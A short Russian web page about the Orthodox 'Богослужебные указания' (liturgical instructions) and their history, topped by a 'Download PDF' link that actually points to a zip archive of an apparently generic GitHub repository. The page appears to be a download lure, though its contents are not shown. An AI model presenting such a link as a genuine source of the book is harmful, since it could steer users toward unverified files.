# Богослужебные указания PDF

[Скачать](https://github.com/buinpdf/download/archive/refs/heads/main.zip)

Богослужебный устав в православии и восточном христианстве — совокупность указаний, определяющих структуру и порядок церковных служб и их сочетаний на все дни года. Типикон — это Церковный устав, который определяет, как в течение всего церковного года соединять за богослужениями в определённом порядке и в нужном количестве молитвословия и песнопения, содержащиеся в богослужебных книгах. В Русской православной церкви принят славянский Типикон, который сложился к концу XVII века на основе Иерусалимского устава. Последняя редакция русского Типикона была осуществлена в 1695 году при Патриархе Адриане.

Богослужебные указания предназначаются для помощи при использовании Типикона, особенно в случаях, когда могут возникнуть затруднения при совершении богослужения. В оглавлении каждого дня указываются имена святых и церковные памяти. Богослужебные указания помогают в богослужении, упрощая труд церковнослужителей. В них содержится схема всех богослужений на каждый день года, а сложные и вариативные случаи комментируются и поясняются. Таким образом, богослужебные указания облегчают техническую сторону совершения богослужения, особенно когда в нём участвует большой хор.

Идея издания «Богослужебных указаний» как ежегодника, содержащего пояснения к использованию Типикона, впервые была предложена в ходе заседаний Отдела о богослужении на Поместном соборе 1917–1918 годов. В 1949 году Издательский отдел Московской Патриархии впервые выпустил «Богослужебные указания» как отдельный сборник, подробно рассматривающий структуру богослужений на каждый календарный день в году. В 1956 году для составления церковного календаря и «Богослужебных указаний» была создана Богослужебно-календарная комиссия. Однако в 1958 году по причине гонений на Церковь, инициированных Н. С. Хрущёвым, комиссия была упразднена, а выпуск «Богослужебных указаний» был прерван. Вопрос о возрождении «Богослужебных указаний» в формате ежегодного сборника актуализировался в начале 1990-х, когда возникла острая необходимость в упорядочении литургической жизни на многочисленных новых приходах в соответствии с предписаниями Типикона. Первый выпуск возрождённых «Богослужебных указаний» был издан в 1996 году, уже после учреждения Издательского совета и Издательства Московской Патриархии. Проект по возрождению «Богослужебных указаний» стал важным шагом на пути упорядочения богослужебной практики в приходских храмах.

